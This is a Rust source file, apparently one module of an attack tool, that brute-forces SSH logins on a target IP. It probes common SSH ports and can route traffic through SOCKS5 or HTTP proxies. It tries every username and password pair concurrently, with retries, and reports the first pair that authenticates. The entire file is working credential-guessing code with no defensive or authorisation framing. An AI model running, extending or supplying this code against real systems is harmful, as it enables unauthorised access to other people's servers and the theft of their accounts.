use anyhow::{Context, Result};
use futures::stream::{FuturesUnordered, StreamExt};
use ssh2::Session;
use std::{
    io,
    net::{SocketAddr, ToSocketAddrs},
    sync::Arc,
    time::Duration,
};
use tokio::{task, time::sleep};
use tokio::net::TcpStream;
use tokio_socks::tcp::Socks5Stream;
use crate::events::BruteEvent;
use crate::proxy::{build_proxy_client, build_direct_client};

const SSH_PORTS: &[u16] = &[22, 2222, 22222];
const CONNECT_TIMEOUT_SECS: u64 = 5;
const RETRY_DELAY_MS: u64 = 200;
const MAX_RETRIES: usize = 2;

/// Brute-force SSH for a single IP
pub async fn bruteforce_ip(
    ip: String,
    usernames: Arc<Vec<String>>,
    passwords: Arc<Vec<String>>,
    proxy: String,
) -> Vec<BruteEvent> {
    let mut events = Vec::new();
    let mut open_port = None;

    for &port in SSH_PORTS {
        if is_port_open(&ip, port, &proxy).await {
            open_port = Some(port);
            events.push(BruteEvent::Info(format!("SSH port {} open on {}", port, ip)));
            break;
        }
    }

    let port = match open_port {
        Some(port) => port,
        None => {
            events.push(BruteEvent::Fail(format!("No open SSH port on {}", ip)));
            return events;
        }
    };

    let mut tasks = FuturesUnordered::new();

    for username in usernames.iter().cloned() {
        for password in passwords.iter().cloned() {
            let ip = ip.clone();
            let username = username.clone();
            let password = password.clone();
            let proxy = proxy.clone();
            tasks.push(task::spawn_blocking(move || {
                try_login(&ip, port, &username, &password, &proxy)
            }));
        }
    }

    while let Some(result) = tasks.next().await {
        match result {
            Ok(Ok(success_string)) => {
                let parts: Vec<&str> = success_string.splitn(2, ':').collect();
                events.push(BruteEvent::Success {
                    protocol: "SSH".to_string(),
                    ip: ip.clone(),
                    username: parts[0].to_string(),
                    password: parts[1].to_string(),
                    port,
                });
                return events;
            }
            Ok(Err(e)) => events.push(BruteEvent::Error(e.to_string())),
            Err(e) => events.push(BruteEvent::Error(format!("Join error: {}", e))),
        }
    }

    events.push(BruteEvent::Fail(format!("SSH brute-force failed on {}", ip)));
    events
}

/// Check if a port is open
async fn is_port_open(ip: &str, port: u16, proxy: &str) -> bool {
    let addr = format!("{}:{}", ip, port);

    if proxy.starts_with("socks5://") {
        let proxy_addr = proxy.trim_start_matches("socks5://");
        tokio::time::timeout(
            Duration::from_secs(CONNECT_TIMEOUT_SECS),
            Socks5Stream::connect(proxy_addr, addr),
        )
        .await
        .map(|r| r.is_ok())
        .unwrap_or(false)
    } else if proxy.starts_with("http://") || proxy.starts_with("https://") {
        match build_proxy_client(proxy) {
            Ok(client) => {
                let url = format!("http://{}", addr);
                match tokio::time::timeout(Duration::from_secs(CONNECT_TIMEOUT_SECS), client.get(&url).send()).await {
                    Ok(Ok(resp)) => resp.status().is_success(),
                    _ => false,
                }
            }
            Err(_) => false,
        }
    } else {
        tokio::time::timeout(
            Duration::from_secs(CONNECT_TIMEOUT_SECS),
            TcpStream::connect(&addr),
        )
        .await
        .map(|r| r.is_ok())
        .unwrap_or(false)
    }
}

/// Try a single SSH login
fn try_login(ip: &str, port: u16, user: &str, pass: &str, proxy: &str) -> Result<String> {
    for attempt in 1..=MAX_RETRIES {
        match connect_via_proxy(ip, port, proxy) {
            Ok(mut stream) => {
                let mut sess = Session::new()?;
                sess.set_tcp_stream(stream);
                sess.handshake()?;

                if sess.userauth_password(user, pass).is_ok() && sess.authenticated() {
                    return Ok(format!("{}:{}", user, pass));
                } else {
                    return Err(anyhow::anyhow!("SSH authentication failed for {}:{}", user, pass));
                }
            }
            Err(e) => {
                if attempt < MAX_RETRIES {
                    std::thread::sleep(Duration::from_millis(RETRY_DELAY_MS));
                } else {
                    return Err(anyhow::anyhow!("SSH connection error: {}", e));
                }
            }
        }
    }
    Err(anyhow::anyhow!("Max retries reached"))
}

/// Establish TCP stream via proxy or direct
fn connect_via_proxy(ip: &str, port: u16, proxy: &str) -> Result<std::net::TcpStream> {
    let target = format!("{}:{}", ip, port);

    if proxy.starts_with("socks5://") {
        let proxy_addr = proxy.trim_start_matches("socks5://");
        let rt = tokio::runtime::Runtime::new()?;
        let stream = rt.block_on(async {
            Socks5Stream::connect(proxy_addr, target).await
        })?;
        let std_stream = stream.into_inner().into_std()?;
        std_stream.set_nonblocking(false)?;
        Ok(std_stream)
    } else {
        let addr: SocketAddr = target.to_socket_addrs()?.next().context("Invalid address")?;
        Ok(std::net::TcpStream::connect_timeout(&addr, Duration::from_secs(CONNECT_TIMEOUT_SECS))?)
    }
}
